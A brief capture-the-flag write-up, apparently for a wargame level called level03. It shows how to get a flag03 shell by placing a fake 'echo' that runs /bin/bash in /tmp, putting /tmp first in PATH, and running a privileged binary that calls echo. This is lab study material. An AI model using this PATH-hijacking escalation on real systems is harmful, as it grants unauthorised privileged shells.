#if you enter ls you will see a file called level03 with flag03 as an owner
#there is a way to get to user flag03 by executing bash but since we don't have permission
#we will use the level03 file to execute bash command
#we can ovveride the echo commande that is inside the level03 file

echo "/bin/bash" > /tmp/echo
chmod 777 /tmp/echo && export PATH=/tmp:$PATH
./level03

#now that we overrid the echo command when we will execute level03
#our system will look for echo on the path and the first one he will find is /tmp/echo
and we will be in flag03 :D !!
